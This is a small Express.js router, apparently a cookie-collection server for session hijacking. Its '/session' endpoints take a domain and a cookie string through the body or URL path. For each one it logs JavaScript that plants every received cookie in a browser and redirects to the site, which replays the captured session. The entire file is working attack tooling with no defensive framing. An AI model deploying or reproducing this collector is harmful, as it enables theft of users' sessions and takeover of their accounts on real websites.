var express = require('express');
var router = express.Router();

//Generator javascript (import cookie) 
function codeJS(domain, cookie){
	var arrCookie= cookie.split(';');
	var salida = "var date = new Date();date.setTime(date.getTime()+(1*24*60*60*1000));var expires = '; expires='+date.toGMTString();"
	for(var i =0;i<arrCookie.length;i++){
		var name = arrCookie[i].split('=')[0].trim();
		var value = arrCookie[i].split('=')[1].trim();
		salida +="document.cookie = '"+name+"="+value+"'+expires+'; path=/';" 
	}
	//add reload (F5)
	salida+="document.location.href='http://"+domain+"';";
	return salida;
}

router.all('/session', function(req, res, next) {
	console.log("----------"+req.body.domain+"---------");
    console.log(codeJS(req.body.domain,req.body.cookie));
	console.log('-----------------------------------------');
	res.send("foorbar");
});
router.all('/session/:domain/:cookie', function(req, res, next) {
	console.log("----------"+req.params.domain+"---------");
    console.log(codeJS(req.params.domain,req.params.cookie));
	console.log('-----------------------------------------');
	res.send("foorbar");
});

module.exports = router;
